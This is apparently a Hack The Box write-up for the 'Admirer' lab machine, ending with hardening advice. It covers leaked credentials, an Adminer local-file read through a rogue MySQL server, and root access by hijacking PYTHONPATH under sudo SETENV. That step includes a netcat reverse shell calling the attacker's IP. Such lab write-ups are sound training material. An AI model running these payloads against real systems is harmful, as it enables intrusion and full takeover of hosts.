# Admirer

```
root@kali:/home/kali/htb/Admirer# nmap -p- -sV -sC 10.129.117.11 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-20 12:52 EDT
Nmap scan report for 10.129.117.11
Host is up (0.025s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.92 seconds
root@kali:/home/kali/htb/Admirer# 
```

There's no anonymous login on ftp. And we can of course not connect to ssh.

So the answer has to lie in the web server. The robots.txt says that /admin-dir contains some important information.

I fuzz it and find nothing. So I try fuzzing for different file types.

I already know the answer lies in the web-server so I just have to dry different wordlists and extensions. Eventually I'll find it.

I don't find anything, so I wonder if maybe I don't have access to the admin-dir directory, but maybe we can access some files within?

```
root@kali:/home/kali/htb/Admirer# wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.117.11/admin-dir/FUZZ.txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.117.11/admin-dir/FUZZ.txt
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                     
=====================================================================

000000001:   403        9 L      28 W       278 Ch      "# directory-list-2.3-medium.txt"           
000000007:   403        9 L      28 W       278 Ch      "# license, visit http://creativecommons.org
                                                        /licenses/by-sa/3.0/"                       
000000003:   403        9 L      28 W       278 Ch      "# Copyright 2007 James Fisher"             
000000006:   403        9 L      28 W       278 Ch      "# Attribution-Share Alike 3.0 License. To v
                                                        iew a copy of this"                         
000000011:   403        9 L      28 W       278 Ch      "# Priority ordered case sensative list, whe
                                                        re entries were found"                      
000000005:   403        9 L      28 W       278 Ch      "# This work is licensed under the Creative 
                                                        Commons"                                    
000000013:   403        9 L      28 W       278 Ch      "#"                                         
000000010:   403        9 L      28 W       278 Ch      "#"                                         
000000008:   403        9 L      28 W       278 Ch      "# or send a letter to Creative Commons, 171
                                                         Second Street,"                            
000000009:   403        9 L      28 W       278 Ch      "# Suite 300, San Francisco, California, 941
                                                        05, USA."                                   
000000012:   403        9 L      28 W       278 Ch      "# on atleast 2 different hosts"            
000000002:   403        9 L      28 W       278 Ch      "#"                                         
000000004:   403        9 L      28 W       278 Ch      "#"                                         
000000227:   200        29 L     39 W       350 Ch      "contacts"                                  
000166817:   200        11 L     13 W       136 Ch      "credentials"                               

Total time: 0
Processed Requests: 220560
Filtered Requests: 220545
Requests/sec.: 0

root@kali:/home/kali/htb/Admirer# 
```

And we get two hits.

contacts.txt:

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

credentials.txt:

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

So I hop into ftp:


```
root@kali:/home/kali/htb/Admirer# ftp 10.129.117.11
Connected to 10.129.117.11.
220 (vsFTPd 3.0.3)
Name (10.129.117.11:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (7.0440 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 1.70 secs (2.9510 MB/s)
ftp> 

```


so we have a sql file and a copy of the website. I unzip the website with 7zip and start to look around.

The contacts and credentials files are different:

```
root@kali:/home/kali/htb/Admirer/html/w4ld0s_s3cr3t_d1r# cat contacts.txt 
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
root@kali:/home/kali/htb/Admirer/html/w4ld0s_s3cr3t_d1r# cat credentials.txt 
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
root@kali:/home/kali/htb/Admirer/html/w4ld0s_s3cr3t_d1r# 
```

I aslo find this in index.php:

```
    $servername = "localhost";
    $username = "waldo";
    $password = "]F7jLHw:*G>UPrTo}~A"d6b";
    $dbname = "admirerdb";
```

There's also the utility scripts:

```
root@kali:/home/kali/htb/Admirer/html/utility-scripts# ls
admin_tasks.php  db_admin.php  info.php  phptest.php
```

in db_admin.php:

```
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";
```

Now that I know more about the infrastructure of the web server I do some more fuzzing. With the new directories I found.

w4ld0s_s3cr3t_d1r was the equivalent of the admin-dir.

So I check utlity-scripts.

```
root@kali:/home/kali/htb/Admirer/html/utility-scripts# ls
admin_tasks.php  db_admin.php  info.php  phptest.php
```

I try some sql tricks but eventually figure that there has to be some sort of page replacing db_admin.php:

```
root@kali:/home/kali/htb/Admirer/html/utility-scripts# wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirb/big.txt http://10.129.117.11/utility-scripts/FUZZ.php
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.117.11/utility-scripts/FUZZ.php
Total requests: 20469

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                     
=====================================================================

000000015:   403        9 L      28 W       278 Ch      ".htaccess"                                 
000000016:   403        9 L      28 W       278 Ch      ".htpasswd"                                 
000001873:   200        51 L     235 W      4157 Ch     "adminer"                                   
000009618:   200        964 L    4976 W     84025 Ch    "info"                                      
000013866:   200        0 L      8 W        32 Ch       "phptest"                                   

Total time: 0
Processed Requests: 20469
Filtered Requests: 20464
Requests/sec.: 0

root@kali:/home/kali/htb/Admirer/html/utility-scripts# 
```

And I find adminer.php

I set up a local mariadb, create a new database called "admire" and a new table called info.

I then go into the adminer.php page and enter my ip and creds to get access.

I go into the SQL command page and then I can read local files with `LOAD DATA LOCAL INFILE '<file path>'`

So we know that there was some creds on the previous index.php file, so what if we try that:

```
LOAD DATA LOCAL INFILE '/var/www/html/index.php'
INTO TABLE admirer.info
FIELDS TERMINATED BY "\n";
```

So we are loading the local file into our local database, and then we are separating the entries by newlines.

We can then read from our local database with `SELECT * from admirer.info`

And I get the index.php page which includes:

```
    $servername = "localhost";
    $username = "waldo";
    $password = "&<h5b~yK3F#{PaPB&dA}{H>";
    $dbname = "admirerdb";
```

So I try ssh:

```
root@kali:/home/kali/htb/Admirer# ssh waldo@10.129.117.11
The authenticity of host '10.129.117.11 (10.129.117.11)' can't be established.
ECDSA key fingerprint is SHA256:NSIaytJ0GOq4AaLY0wPFdPsnuw/wBUt2SvaCdiFM8xI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                    
Warning: Permanently added '10.129.117.11' (ECDSA) to the list of known hosts.
waldo@10.129.117.11's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
/usr/bin/xauth:  file /home/waldo/.Xauthority does not exist
waldo@admirer:~$ id
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
waldo@admirer:~$ 
```

So what does setenv do?

When we sudo this file, we can also set the environment path. So it allows us to create the primary path for this command.


And let's also check out the script we have access to:

```
waldo@admirer:~$ ls -la /opt/scripts/ 
total 16
drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh 
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
waldo@admirer:~$ cat /opt/scripts/backup.py 
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
waldo@admirer:~$ 
```

So we can see that the admin_tasks.sh script is running `/opt/scripts/backup.py &` in the background. If we choose option 6.

And we can see that python is importing shutil.

So we can use setenv to reroute the pythonpath to a folder we have chosen, then we create shutil.py with a reverse shell.

I try this:

```
waldo@admirer:/tmp/env$ cat shutil.py 
import os

os.system("/bin/nc -e /bin/bash 10.10.14.51 1337")
waldo@admirer:/tmp/env$ sudo -E PYTHONPATH=/tmp/env/ /opt/scripts/admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...

```

And on the listener:

```
root@kali:/home/kali/htb/Admirer# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.117.11 42324
whoami
root
```


## Comparing myself with the official writeup:

They find the creds behind admin-dir and try to ssh-spray with generated usernames and passwords.

They get the ftp files and find the database information.

They find adminer with some fuzzing.

they install and configure mariadb and abuse the adminer page. They get the index.php creds and log in via ssh.

they use linPEAS to enumerate the system and find the backup.py file with it.

Using the SETENV sudo, they create a new shutil.py file and get root via a reverse netcat shell.


## How to stop this exploit:

Storing the credits on the web server with no authentication is a bad idea. although the folder is forbidden, the contents are not.

Hardcoding passwords into the index page is also scary. Especially when you reuse the passwords as was done here.

Adminer should be updated to the latest version.

I wonder what the reason for using SETENV was here. Giving user waldo sudo power on the shellscript is a weird choice. As it is already separated between normal use and root use. 

So giving user waldo the power to use root here seems weird. Bad practice nonetheless.

A cool exploit though.